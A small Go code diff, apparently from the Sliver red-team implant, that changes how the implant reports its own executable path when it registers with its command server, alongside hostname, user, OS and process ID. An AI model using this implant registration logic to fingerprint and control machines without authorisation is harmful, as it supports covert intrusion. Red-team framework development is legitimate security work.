@@ -212,6 +212,12 @@ func getReconnectInterval() time.Duration {
 func getRegisterSliver() *pb.Envelope {
 	hostname, _ := os.Hostname()
 	currentUser, _ := user.Current()
+	filename, err := os.Executable()
+	// Should not happen, but still...
+	if err != nil {
+		//TODO: build the absolute path to os.Args[0]
+		filename = os.Args[0]
+	}
 	data, _ := proto.Marshal(&pb.Register{
 		Name:     sliverName,
 		Hostname: hostname,
@@ -221,7 +227,7 @@ func getRegisterSliver() *pb.Envelope {
 		Os:       runtime.GOOS,
 		Arch:     runtime.GOARCH,
 		Pid:      int32(os.Getpid()),
-		Filename: os.Args[0],
+		Filename: filename,
 	})
 	envelope := &pb.Envelope{
 		Type: pb.MsgRegister,
